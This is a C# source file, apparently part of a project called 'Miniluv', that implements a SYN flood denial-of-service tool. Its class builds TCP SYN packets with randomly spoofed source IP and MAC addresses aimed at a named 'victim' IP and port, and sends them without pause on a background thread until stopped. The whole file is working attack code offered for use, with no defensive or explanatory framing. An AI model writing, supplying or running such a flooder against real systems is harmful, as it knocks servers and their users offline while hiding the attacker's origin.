using Assimilation;
using PacketDotNet;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Miniluv
{
    public class SynFlood
    {
        public stDeviceInfo m_stDeviceInfo;
        public bool m_bFlooding { get; set; }

        public SynFlood(stDeviceInfo stDeviceInfo)
        {
            m_stDeviceInfo = stDeviceInfo;
            m_bFlooding = false;
        }

        public Packet MakeMalSYNPacket(string szVictimIP, int nPort)
        {
            PhysicalAddress myMAC = IPTool.RandomMacAddress(); //m_stDeviceInfo.device.MacAddress;

            EthernetPacket pktEth = new EthernetPacket(myMAC, m_stDeviceInfo.networkInterface.GetPhysicalAddress(), EthernetType.IPv4);
            IPv4Packet pktV4 = new IPv4Packet(IPTool.RandomIPv4Address(), IPAddress.Parse(szVictimIP));
            TcpPacket pktTCP = new TcpPacket((ushort)new Random().Next(1024, 65535), (ushort)nPort);

            pktV4.Id = 1000;

            pktTCP.Synchronize = true;
            pktTCP.SequenceNumber = (uint)new Random().Next(1000, 9000);
            pktTCP.AcknowledgmentNumber = 0;
            pktTCP.WindowSize = 8192;

            pktV4.PayloadPacket = pktTCP;

            pktTCP.UpdateTcpChecksum();
            pktV4.UpdateIPChecksum();

            pktEth.PayloadPacket = pktV4;

            return pktEth;
        }

        public void Start(string szVictimIP, int nPort = 80)
        {
            m_bFlooding = true;

            new Thread(() =>
            {
                while (m_bFlooding)
                {
                    Packet pkt = MakeMalSYNPacket(szVictimIP, nPort);
                    m_stDeviceInfo.device.SendPacket(pkt.Bytes);
                }
            }).Start();
        }

        public void Stop()
        {
            m_bFlooding = false;
        }
    }
}
